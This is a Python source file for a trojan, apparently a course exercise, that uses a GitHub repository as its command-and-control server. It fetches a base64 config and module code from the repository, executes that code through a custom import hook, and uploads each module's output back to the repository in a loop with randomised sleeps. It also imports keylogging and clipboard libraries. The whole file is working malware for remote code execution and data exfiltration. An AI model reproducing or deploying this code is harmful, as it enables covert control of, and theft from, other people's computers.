import json
import base64
import sys
import time
import imp
import random
import re
import threading
import queue
import os

# keylogger
import pyperclip
import keyboard

from github3 import login

trojan_id = "abc"
counts = None

trojan_config = f"config/{trojan_id}.json"
data_path = f"data/{trojan_id}"
trojan_modules = []
configured = False
task_queue = queue.Queue()

def connect_to_github():
    gh = login(url="https://github.zhaw.ch/",username="cailllev", password=input("Input github password: "))
    repo = gh.repository("cailllev", "bhp_trojan")
    branch = repo.branch("master")

    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    files = tree._json_data['tree']

    # find the sha value of the file at filepath
    print(f"[*] Searching in GitHub for file: {filepath}")
    for file in files:
        if file['path'] == filepath:
            print(f"[*] Found file {filepath}")
            print("[*]")

            # get the blob
            blob = repo.blob(file['sha'])
            return blob.content

    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            print(f"[*] Exec \"import {task['module']}\"")
            exec(f"import {task['module']}")

    return config

def store_module_result(data, module_name):
    print("[*] Upload results to GitHub")
    print(f"[*] Result: {data[0:64]}")
    
    count = get_count(module_name)
    counts[module_name] += 1
    
    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{module_name}_{count+1}"
    repo.create_file(remote_path, module_name, base64.b64encode(data.encode()))
    print("[*]")
    
def get_count(module_name):
    global counts
    
    # only get counts if undefined
    if counts is None:
        counts = {}
    
    if module_name not in counts:
        print(f"[*] Getting counts for module {module_name} from GitHub")
        
        gh, repo, branch = connect_to_github()
        tree = branch.commit.commit.tree.to_tree().recurse()
        files = tree._json_data['tree']
        
        # paths in questions are e.g. "data/abc/environ_1, data/abc/environ_2"
        searchpath = f"data/{trojan_id}/{module_name}_"
        
        # isolate paths
        filepaths = map(lambda file : file['path'], files)
        
        # only take valid paths
        module_files = list(filter(lambda path: path.startswith(searchpath), filepaths))
        
        # strip all but id from files
        ids = list(map(lambda module_file : re.sub(searchpath, '', module_file), module_files))
        
        try:
            count = int(max(ids))
        except: 
            count = 0
            
        counts[module_name] = count
        
    return counts[module_name]

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
    
        if configured:
            print(f"[*] Attemting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}.py")

            # only use the GitImporter for custom modules
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
                
        # return None means load_module cant execute, meaning the default importer will import   
        return None
        

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module

        return module

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in our repo
    store_module_result(result, module)

# main trojan loop
sys.meta_path = [GitImporter()]

while True:
    try:
        if task_queue.empty():
            config = get_trojan_config()

            for task in config:
                t = threading.Thread(target=module_runner, args=(task['module'],))
                t.start()
                time.sleep(random.randint(1, 5))

        time.sleep(random.randint(1000, 10000))
    except KeyboardInterrupt:
        print()
        sys.exit(0)
